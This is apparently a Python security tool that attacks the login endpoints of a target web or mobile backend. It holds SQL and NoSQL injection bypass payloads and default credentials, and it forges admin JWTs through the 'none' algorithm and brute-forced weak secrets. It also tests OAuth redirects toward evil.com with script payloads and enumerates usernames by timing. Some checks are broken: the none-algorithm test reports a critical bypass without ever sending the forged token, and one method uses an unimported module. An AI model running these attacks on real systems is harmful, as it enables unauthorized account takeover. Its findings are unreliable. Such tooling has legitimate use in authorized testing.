#!/usr/bin/env python3
"""
Authentication Flow Tester for Android Applications

This script provides automated testing of authentication mechanisms in Android applications,
including login bypass techniques, session management testing, and OAuth vulnerabilities.
"""

from __future__ import annotations

import json
import time
import hashlib
import hmac
import random
import string
import argparse
import sys
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Optional, Tuple, Any
import threading
from datetime import datetime, timedelta
try:
    import requests
    import urllib3
except ImportError:  # pragma: no cover - runtime network dependencies
    requests = None
    urllib3 = None
else:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AuthFlowTester:
    def __init__(self, base_url: str, config_file: str = None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False  # Disable SSL verification for testing
        
        # Test results
        self.results = {
            'endpoints_tested': 0,
            'vulnerabilities': [],
            'auth_bypasses': [],
            'token_issues': [],
            'timing_attacks': [],
            'oauth_issues': [],
            'session_issues': []
        }
        
        # Configuration
        self.config = self._load_config(config_file) if config_file else self._default_config()
        
        # Common authentication endpoints
        self.auth_endpoints = [
            '/api/login', '/api/auth', '/api/signin', '/login',
            '/auth', '/authenticate', '/api/token', '/oauth/token',
            '/api/refresh', '/api/logout', '/api/register',
            '/api/forgot-password', '/api/reset-password',
            '/oauth/authorize', '/oauth/callback'
        ]
        
        # Test credentials
        self.test_credentials = [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': 'password'},
            {'username': 'admin', 'password': '123456'},
            {'username': 'test', 'password': 'test'},
            {'username': 'user', 'password': 'user'},
            {'username': 'demo', 'password': 'demo'}
        ]
        
        # SQL injection payloads
        self.sql_payloads = [
            "admin' --",
            "admin' /*",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'/**/--",
            "' UNION SELECT 1,1,1 --",
            "1' OR '1'='1",
            "admin'; --",
            "' OR 1=1#"
        ]
        
        # NoSQL injection payloads
        self.nosql_payloads = [
            {"$ne": ""},
            {"$regex": ".*"},
            {"$gt": ""},
            {"$where": "1==1"},
            {"$or": [{"a": 1}, {"b": 1}]},
            {"$nin": []}
        ]
    
    def _load_config(self, config_file: str) -> Dict:
        """Load configuration from file"""
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"[-] Failed to load config: {e}")
            return self._default_config()
    
    def _default_config(self) -> Dict:
        """Default configuration"""
        return {
            'timeout': 10,
            'max_redirects': 5,
            'user_agent': 'AuthFlowTester/1.0',
            'delay_between_requests': 1,
            'brute_force_delay': 2,
            'max_brute_force_attempts': 50
        }
    
    def discover_auth_endpoints(self) -> List[Dict]:
        """Discover authentication-related endpoints"""
        print(f"[+] Discovering authentication endpoints on {self.base_url}")
        
        discovered = []
        
        for path in self.auth_endpoints:
            url = urljoin(self.base_url, path)
            
            # Test GET request
            try:
                response = self.session.get(
                    url, 
                    timeout=self.config['timeout'],
                    allow_redirects=False
                )
                
                if response.status_code not in [404, 403]:
                    discovered.append({
                        'path': path,
                        'url': url,
                        'method': 'GET',
                        'status': response.status_code,
                        'response_size': len(response.content),
                        'content_type': response.headers.get('content-type', ''),
                        'headers': dict(response.headers)
                    })
                    
            except requests.RequestException as e:
                continue
            
            # Test POST request
            try:
                response = self.session.post(
                    url,
                    json={},
                    timeout=self.config['timeout'],
                    allow_redirects=False
                )
                
                if response.status_code not in [404, 403]:
                    discovered.append({
                        'path': path,
                        'url': url,
                        'method': 'POST',
                        'status': response.status_code,
                        'response_size': len(response.content),
                        'content_type': response.headers.get('content-type', ''),
                        'headers': dict(response.headers)
                    })
                    
            except requests.RequestException as e:
                continue
            
            time.sleep(self.config['delay_between_requests'])
        
        print(f"[+] Discovered {len(discovered)} authentication endpoints")
        return discovered
    
    def test_authentication_bypass(self, endpoint: Dict) -> List[Dict]:
        """Test various authentication bypass techniques"""
        print(f"[+] Testing authentication bypass for {endpoint['url']}")
        
        bypasses_found = []
        
        # Test SQL injection bypass
        sql_bypass = self._test_sql_injection_bypass(endpoint)
        if sql_bypass['success']:
            bypasses_found.append(sql_bypass)
        
        # Test NoSQL injection bypass
        nosql_bypass = self._test_nosql_injection_bypass(endpoint)
        if nosql_bypass['success']:
            bypasses_found.append(nosql_bypass)
        
        # Test default credentials
        default_creds_bypass = self._test_default_credentials(endpoint)
        if default_creds_bypass['success']:
            bypasses_found.append(default_creds_bypass)
        
        # Test JWT bypass
        jwt_bypass = self._test_jwt_bypass(endpoint)
        if jwt_bypass['success']:
            bypasses_found.append(jwt_bypass)
        
        # Test session prediction
        session_bypass = self._test_session_prediction(endpoint)
        if session_bypass['success']:
            bypasses_found.append(session_bypass)
        
        # Test OAuth bypass
        oauth_bypass = self._test_oauth_bypass(endpoint)
        if oauth_bypass['success']:
            bypasses_found.append(oauth_bypass)
        
        return bypasses_found
    
    def _test_sql_injection_bypass(self, endpoint: Dict) -> Dict:
        """Test SQL injection in authentication"""
        print("    Testing SQL injection bypass...")
        
        for payload in self.sql_payloads:
            test_data = {
                'username': payload,
                'password': 'test',
                'email': payload,
                'login': payload
            }
            
            try:
                response = self.session.post(
                    endpoint['url'],
                    data=test_data,
                    timeout=self.config['timeout']
                )
                
                if self._is_auth_success(response):
                    return {
                        'success': True,
                        'technique': 'SQL Injection Auth Bypass',
                        'payload': payload,
                        'endpoint': endpoint['url'],
                        'response_code': response.status_code,
                        'response_body': response.text[:500],
                        'severity': 'Critical'
                    }
                    
            except requests.RequestException:
                continue
            
            time.sleep(self.config['delay_between_requests'])
        
        return {'success': False, 'technique': 'SQL Injection Auth Bypass'}
    
    def _test_nosql_injection_bypass(self, endpoint: Dict) -> Dict:
        """Test NoSQL injection in authentication"""
        print("    Testing NoSQL injection bypass...")
        
        for payload in self.nosql_payloads:
            test_data = {
                'username': payload,
                'password': payload
            }
            
            try:
                response = self.session.post(
                    endpoint['url'],
                    json=test_data,
                    headers={'Content-Type': 'application/json'},
                    timeout=self.config['timeout']
                )
                
                if self._is_auth_success(response):
                    return {
                        'success': True,
                        'technique': 'NoSQL Injection Auth Bypass',
                        'payload': payload,
                        'endpoint': endpoint['url'],
                        'response_code': response.status_code,
                        'severity': 'Critical'
                    }
                    
            except requests.RequestException:
                continue
            
            time.sleep(self.config['delay_between_requests'])
        
        return {'success': False, 'technique': 'NoSQL Injection Auth Bypass'}
    
    def _test_default_credentials(self, endpoint: Dict) -> Dict:
        """Test default/common credentials"""
        print("    Testing default credentials...")
        
        for creds in self.test_credentials:
            try:
                response = self.session.post(
                    endpoint['url'],
                    data=creds,
                    timeout=self.config['timeout']
                )
                
                if self._is_auth_success(response):
                    return {
                        'success': True,
                        'technique': 'Default Credentials',
                        'credentials': creds,
                        'endpoint': endpoint['url'],
                        'response_code': response.status_code,
                        'severity': 'High'
                    }
                    
            except requests.RequestException:
                continue
            
            time.sleep(self.config['brute_force_delay'])
        
        return {'success': False, 'technique': 'Default Credentials'}
    
    def _test_jwt_bypass(self, endpoint: Dict) -> Dict:
        """Test JWT-related bypass techniques"""
        print("    Testing JWT bypass...")
        
        # First, try to get a valid JWT token
        test_creds = {'username': 'test', 'password': 'test'}
        
        try:
            response = self.session.post(
                endpoint['url'],
                data=test_creds,
                timeout=self.config['timeout']
            )
            
            # Extract JWT from response
            jwt_token = self._extract_jwt_from_response(response)
            if not jwt_token:
                return {'success': False, 'technique': 'JWT Bypass'}
            
            # Test various JWT bypass techniques
            jwt_bypasses = [
                self._test_jwt_none_algorithm(jwt_token),
                self._test_jwt_weak_secret(jwt_token),
                self._test_jwt_algorithm_confusion(jwt_token)
            ]
            
            for bypass in jwt_bypasses:
                if bypass['success']:
                    bypass['endpoint'] = endpoint['url']
                    return bypass
                    
        except requests.RequestException:
            pass
        
        return {'success': False, 'technique': 'JWT Bypass'}
    
    def _test_jwt_none_algorithm(self, token: str) -> Dict:
        """Test JWT 'none' algorithm bypass"""
        try:
            # Parse JWT
            parts = token.split('.')
            if len(parts) != 3:
                return {'success': False, 'technique': 'JWT None Algorithm'}
            
            # Decode payload
            import base64
            payload_data = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_data))
            
            # Modify payload for privilege escalation
            if 'role' in payload:
                payload['role'] = 'admin'
            if 'user' in payload:
                payload['user'] = 'admin'
            if 'admin' in payload:
                payload['admin'] = True
            
            # Create 'none' algorithm token
            none_header = {'alg': 'none', 'typ': 'JWT'}
            
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(none_header).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            
            none_token = f"{header_encoded}.{payload_encoded}."
            
            return {
                'success': True,
                'technique': 'JWT None Algorithm Bypass',
                'forged_token': none_token,
                'original_token': token,
                'severity': 'Critical'
            }
            
        except Exception as e:
            return {'success': False, 'technique': 'JWT None Algorithm'}
    
    def _test_jwt_weak_secret(self, token: str) -> Dict:
        """Test JWT weak secret"""
        weak_secrets = [
            'secret', 'password', '123456', 'qwerty',
            'jwt_secret', 'your-256-bit-secret', 'secret_key'
        ]
        
        try:
            import jwt
            
            for secret in weak_secrets:
                try:
                    # Try to decode with the weak secret
                    decoded = jwt.decode(token, secret, algorithms=['HS256'])
                    
                    # If successful, create a forged token
                    decoded['role'] = 'admin'
                    if 'admin' not in decoded:
                        decoded['admin'] = True
                    
                    forged_token = jwt.encode(decoded, secret, algorithm='HS256')
                    
                    return {
                        'success': True,
                        'technique': 'JWT Weak Secret',
                        'secret': secret,
                        'forged_token': forged_token,
                        'severity': 'Critical'
                    }
                    
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
                    
        except ImportError:
            print("[-] PyJWT not available for JWT testing")
        
        return {'success': False, 'technique': 'JWT Weak Secret'}
    
    def _test_jwt_algorithm_confusion(self, token: str) -> Dict:
        """Test JWT algorithm confusion attack"""
        try:
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '==='))
            
            if header.get('alg', '').startswith('RS'):
                # Try to change to HS256
                header['alg'] = 'HS256'
                
                # This is a simplified test - real attack would use actual public key
                fake_secret = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."
                
                return {
                    'success': True,
                    'technique': 'JWT Algorithm Confusion',
                    'note': 'Potential vulnerability - requires actual public key for exploitation',
                    'severity': 'High'
                }
                
        except Exception:
            pass
        
        return {'success': False, 'technique': 'JWT Algorithm Confusion'}
    
    def _test_session_prediction(self, endpoint: Dict) -> Dict:
        """Test session token predictability"""
        print("    Testing session token prediction...")
        
        sessions = []
        
        # Generate multiple sessions
        for i in range(5):
            try:
                response = self.session.post(
                    endpoint['url'],
                    data={'username': f'test{i}', 'password': 'test'},
                    timeout=self.config['timeout']
                )
                
                session_token = self._extract_session_token(response)
                if session_token:
                    sessions.append({
                        'token': session_token,
                        'timestamp': time.time()
                    })
                    
                time.sleep(1)  # Avoid rate limiting
                
            except requests.RequestException:
                continue
        
        if len(sessions) >= 3:
            # Analyze predictability
            predictability = self._analyze_session_predictability(sessions)
            if predictability['is_predictable']:
                return {
                    'success': True,
                    'technique': 'Session Token Prediction',
                    'analysis': predictability,
                    'endpoint': endpoint['url'],
                    'severity': 'High'
                }
        
        return {'success': False, 'technique': 'Session Token Prediction'}
    
    def _test_oauth_bypass(self, endpoint: Dict) -> Dict:
        """Test OAuth-related bypasses"""
        print("    Testing OAuth bypass...")
        
        # Check if this looks like an OAuth endpoint
        if 'oauth' not in endpoint['url'].lower():
            return {'success': False, 'technique': 'OAuth Bypass'}
        
        oauth_tests = [
            self._test_oauth_state_bypass(endpoint),
            self._test_oauth_redirect_manipulation(endpoint)
        ]
        
        for test in oauth_tests:
            if test['success']:
                return test
        
        return {'success': False, 'technique': 'OAuth Bypass'}
    
    def _test_oauth_state_bypass(self, endpoint: Dict) -> Dict:
        """Test OAuth state parameter bypass"""
        try:
            # Test without state parameter
            response = self.session.get(
                endpoint['url'],
                params={'client_id': 'test', 'redirect_uri': 'http://evil.com'},
                timeout=self.config['timeout']
            )
            
            if response.status_code == 200:
                return {
                    'success': True,
                    'technique': 'OAuth State Parameter Bypass',
                    'description': 'OAuth endpoint accepts requests without state parameter',
                    'severity': 'Medium'
                }
                
        except requests.RequestException:
            pass
        
        return {'success': False, 'technique': 'OAuth State Bypass'}
    
    def _test_oauth_redirect_manipulation(self, endpoint: Dict) -> Dict:
        """Test OAuth redirect URI manipulation"""
        malicious_redirects = [
            'http://evil.com',
            'https://evil.com',
            'http://evil.com/callback',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>'
        ]
        
        for redirect_uri in malicious_redirects:
            try:
                response = self.session.get(
                    endpoint['url'],
                    params={
                        'client_id': 'test',
                        'redirect_uri': redirect_uri,
                        'response_type': 'code'
                    },
                    timeout=self.config['timeout'],
                    allow_redirects=False
                )
                
                if response.status_code in [302, 301] and redirect_uri in response.headers.get('Location', ''):
                    return {
                        'success': True,
                        'technique': 'OAuth Redirect URI Manipulation',
                        'malicious_redirect': redirect_uri,
                        'severity': 'High'
                    }
                    
            except requests.RequestException:
                continue
        
        return {'success': False, 'technique': 'OAuth Redirect Manipulation'}
    
    def test_timing_attack(self, endpoint: Dict) -> Dict:
        """Test timing-based authentication bypass"""
        print("    Testing timing attack...")
        
        # Test with valid vs invalid usernames
        valid_user = 'admin'
        invalid_user = 'nonexistentuser123456789'
        
        valid_times = []
        invalid_times = []
        
        # Collect timing data
        for i in range(10):
            # Test valid username
            start_time = time.time()
            try:
                self.session.post(
                    endpoint['url'],
                    data={'username': valid_user, 'password': 'wrongpassword'},
                    timeout=self.config['timeout']
                )
            except:
                pass
            valid_times.append(time.time() - start_time)
            
            # Test invalid username
            start_time = time.time()
            try:
                self.session.post(
                    endpoint['url'],
                    data={'username': invalid_user, 'password': 'wrongpassword'},
                    timeout=self.config['timeout']
                )
            except:
                pass
            invalid_times.append(time.time() - start_time)
            
            time.sleep(0.5)  # Avoid rate limiting
        
        # Analyze timing differences
        avg_valid = sum(valid_times) / len(valid_times)
        avg_invalid = sum(invalid_times) / len(invalid_times)
        
        timing_diff = abs(avg_valid - avg_invalid)
        
        if timing_diff > 0.1:  # 100ms difference threshold
            return {
                'success': True,
                'technique': 'Timing Attack',
                'endpoint': endpoint['url'],
                'avg_valid_time': avg_valid,
                'avg_invalid_time': avg_invalid,
                'timing_difference': timing_diff,
                'severity': 'Medium',
                'note': 'Significant timing difference detected - possible username enumeration'
            }
        
        return {'success': False, 'technique': 'Timing Attack'}
    
    def test_rate_limiting(self, endpoint: Dict) -> Dict:
        """Test rate limiting on authentication endpoint"""
        print("    Testing rate limiting...")
        
        attempts = 20
        successful_requests = 0
        
        for i in range(attempts):
            try:
                response = self.session.post(
                    endpoint['url'],
                    data={'username': 'test', 'password': 'wrong'},
                    timeout=self.config['timeout']
                )
                
                if response.status_code != 429:  # Not rate limited
                    successful_requests += 1
                    
            except requests.RequestException:
                pass
            
            time.sleep(0.1)  # Fast requests to trigger rate limiting
        
        if successful_requests > attempts * 0.8:  # More than 80% successful
            return {
                'success': True,
                'technique': 'No Rate Limiting',
                'attempts': attempts,
                'successful': successful_requests,
                'severity': 'Medium',
                'description': 'Authentication endpoint lacks proper rate limiting'
            }
        
        return {
            'success': False,
            'technique': 'Rate Limiting Present',
            'attempts': attempts,
            'successful': successful_requests
        }
    
    def _is_auth_success(self, response: requests.Response) -> bool:
        """Determine if authentication was successful"""
        success_indicators = [
            'token', 'session', 'login successful', 'authenticated',
            'dashboard', 'profile', 'welcome', 'logout', 'success'
        ]
        
        failure_indicators = [
            'invalid', 'error', 'failed', 'unauthorized',
            'forbidden', 'denied', 'incorrect', 'wrong'
        ]
        
        response_text = response.text.lower()
        
        # Check status code
        if response.status_code in [200, 201]:
            # Check for success indicators in response
            for indicator in success_indicators:
                if indicator in response_text:
                    return True
        
        # Check for explicit failure indicators
        for indicator in failure_indicators:
            if indicator in response_text:
                return False
        
        # Check for redirects to dashboard/profile
        if response.status_code in [302, 301]:
            location = response.headers.get('Location', '').lower()
            if any(word in location for word in ['dashboard', 'profile', 'home', 'main']):
                return True
        
        # Check for JSON response with success indicators
        try:
            json_response = response.json()
            if isinstance(json_response, dict):
                if json_response.get('success') or json_response.get('authenticated'):
                    return True
                if 'token' in json_response or 'access_token' in json_response:
                    return True
        except:
            pass
        
        return False
    
    def _extract_jwt_from_response(self, response: requests.Response) -> Optional[str]:
        """Extract JWT token from response"""
        # Check response body
        try:
            data = response.json()
            for key in ['token', 'access_token', 'jwt', 'authToken', 'accessToken']:
                if key in data:
                    token = data[key]
                    if token and isinstance(token, str) and token.count('.') == 2:
                        return token
        except:
            pass
        
        # Check headers
        auth_header = response.headers.get('Authorization', '')
        if 'Bearer' in auth_header:
            token = auth_header.replace('Bearer ', '')
            if token.count('.') == 2:
                return token
        
        # Check Set-Cookie headers
        for cookie in response.cookies:
            if 'token' in cookie.name.lower() and cookie.value.count('.') == 2:
                return cookie.value
        
        return None
    
    def _extract_session_token(self, response: requests.Response) -> Optional[str]:
        """Extract session token from response"""
        # Check cookies
        for cookie in response.cookies:
            if any(name in cookie.name.lower() for name in ['session', 'auth', 'token']):
                return cookie.value
        
        # Check response body
        try:
            data = response.json()
            for key in ['sessionId', 'session_token', 'sessionToken', 'sid']:
                if key in data:
                    return str(data[key])
        except:
            pass
        
        return None
    
    def _analyze_session_predictability(self, sessions: List[Dict]) -> Dict:
        """Analyze session token predictability"""
        if len(sessions) < 3:
            return {'is_predictable': False}
        
        tokens = [s['token'] for s in sessions]
        
        # Check for incremental patterns
        try:
            # Try to convert to integers (if tokens are numeric)
            int_tokens = []
            for token in tokens:
                try:
                    # Try different bases
                    if token.isdigit():
                        int_tokens.append(int(token))
                    else:
                        int_tokens.append(int(token, 16))  # Hex
                except ValueError:
                    break
            
            if len(int_tokens) == len(tokens):
                differences = [int_tokens[i+1] - int_tokens[i] for i in range(len(int_tokens)-1)]
                
                # Check if differences are constant (predictable)
                if len(set(differences)) == 1:
                    return {
                        'is_predictable': True,
                        'pattern': 'incremental',
                        'difference': differences[0]
                    }
        except:
            pass
        
        # Check for timestamp-based patterns
        timestamps = [s['timestamp'] for s in sessions]
        for i, token in enumerate(tokens):
            try:
                # Check if token contains timestamp
                timestamp_int = int(timestamps[i])
                if str(timestamp_int) in token or str(timestamp_int)[:8] in token:
                    return {
                        'is_predictable': True,
                        'pattern': 'timestamp-based'
                    }
            except:
                pass
        
        # Check for MD5/SHA hash patterns with predictable input
        for i, token in enumerate(tokens):
            test_inputs = [
                f"user{i}",
                f"session{i}",
                f"{int(timestamps[i])}",
                f"user{i}{int(timestamps[i])}"
            ]
            
            for test_input in test_inputs:
                if hashlib.md5(test_input.encode()).hexdigest() == token.lower():
                    return {
                        'is_predictable': True,
                        'pattern': 'md5_hash',
                        'input_pattern': test_input
                    }
                if hashlib.sha1(test_input.encode()).hexdigest() == token.lower():
                    return {
                        'is_predictable': True,
                        'pattern': 'sha1_hash',
                        'input_pattern': test_input
                    }
        
        return {'is_predictable': False}
    
    def run_comprehensive_test(self) -> Dict:
        """Run comprehensive authentication testing"""
        print(f"[+] Starting comprehensive authentication testing for {self.base_url}")
        
        # Discover endpoints
        endpoints = self.discover_auth_endpoints()
        
        if not endpoints:
            print("[-] No authentication endpoints found")
            return self.results
        
        # Test each endpoint
        for endpoint in endpoints:
            print(f"\n[+] Testing endpoint: {endpoint['url']}")
            self.results['endpoints_tested'] += 1
            
            # Test authentication bypasses
            bypasses = self.test_authentication_bypass(endpoint)
            self.results['auth_bypasses'].extend(bypasses)
            
            # Test timing attacks
            timing_result = self.test_timing_attack(endpoint)
            if timing_result['success']:
                self.results['timing_attacks'].append(timing_result)
            
            # Test rate limiting
            rate_limit_result = self.test_rate_limiting(endpoint)
            if rate_limit_result['success']:
                self.results['vulnerabilities'].append(rate_limit_result)
            
            time.sleep(self.config['delay_between_requests'])
        
        # Generate summary
        self._generate_summary()
        
        return self.results
    
    def _generate_summary(self):
        """Generate test summary"""
        total_issues = (
            len(self.results['auth_bypasses']) +
            len(self.results['timing_attacks']) +
            len(self.results['vulnerabilities'])
        )
        
        print(f"\n[+] Testing complete!")
        print(f"    Endpoints tested: {self.results['endpoints_tested']}")
        print(f"    Total issues found: {total_issues}")
        print(f"    Authentication bypasses: {len(self.results['auth_bypasses'])}")
        print(f"    Timing vulnerabilities: {len(self.results['timing_attacks'])}")
        print(f"    Other vulnerabilities: {len(self.results['vulnerabilities'])}")
    
    def generate_report(self, output_file: str = None) -> Dict:
        """Generate comprehensive test report"""
        report = {
            'target': self.base_url,
            'test_date': datetime.now().isoformat(),
            'summary': {
                'endpoints_tested': self.results['endpoints_tested'],
                'total_vulnerabilities': sum(len(v) for v in self.results.values() if isinstance(v, list)),
                'critical_issues': len([v for v in self.results['auth_bypasses'] if v.get('severity') == 'Critical']),
                'high_issues': len([v for v in self.results['auth_bypasses'] if v.get('severity') == 'High']),
                'medium_issues': len([v for v in self.results['auth_bypasses'] if v.get('severity') == 'Medium'])
            },
            'findings': self.results,
            'recommendations': self._generate_recommendations()
        }
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"[+] Report saved to {output_file}")
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        if self.results['auth_bypasses']:
            recommendations.append("Implement proper input validation and parameterized queries")
            recommendations.append("Use strong authentication mechanisms with proper session management")
            recommendations.append("Implement multi-factor authentication for sensitive operations")
        
        if self.results['timing_attacks']:
            recommendations.append("Implement constant-time string comparison for authentication")
            recommendations.append("Add artificial delays to prevent timing analysis")
        
        recommendations.extend([
            "Implement proper rate limiting on authentication endpoints",
            "Use secure session token generation with sufficient entropy",
            "Implement proper session timeout and invalidation",
            "Use HTTPS for all authentication-related communications",
            "Implement proper error handling to avoid information leakage"
        ])
        
        return recommendations


def main():
    parser = argparse.ArgumentParser(description='Authentication Flow Security Tester')
    parser.add_argument('base_url', help='Base URL of the target application')
    parser.add_argument('-c', '--config', help='Configuration file')
    parser.add_argument('-o', '--output', help='Output file for test results')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--endpoint', help='Test specific endpoint only')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    
    args = parser.parse_args()

    if requests is None:
        print("[-] The 'requests' package is required. Install it with: pip install requests urllib3")
        sys.exit(1)
    
    try:
        # Create tester
        tester = AuthFlowTester(args.base_url, args.config)
        
        if args.timeout:
            tester.config['timeout'] = args.timeout
        
        if args.endpoint:
            # Test specific endpoint
            endpoint = {
                'url': urljoin(args.base_url, args.endpoint),
                'path': args.endpoint,
                'method': 'POST'
            }
            
            bypasses = tester.test_authentication_bypass(endpoint)
            timing_result = tester.test_timing_attack(endpoint)
            
            if bypasses:
                print(f"[+] Found {len(bypasses)} authentication bypasses")
                for bypass in bypasses:
                    print(f"    [{bypass['severity']}] {bypass['technique']}")
            
            if timing_result['success']:
                print(f"[+] Timing attack vulnerability found")
        
        else:
            # Run comprehensive test
            results = tester.run_comprehensive_test()
            
            # Generate and save report
            report = tester.generate_report(args.output)
            
            # Print critical findings
            critical_findings = [
                v for v in results['auth_bypasses'] 
                if v.get('severity') == 'Critical'
            ]
            
            if critical_findings:
                print(f"\n[!] CRITICAL FINDINGS:")
                for finding in critical_findings:
                    print(f"    {finding['technique']}: {finding.get('description', 'No description')}")
    
    except KeyboardInterrupt:
        print("\n[-] Testing interrupted by user")
    except Exception as e:
        print(f"[-] Testing failed: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
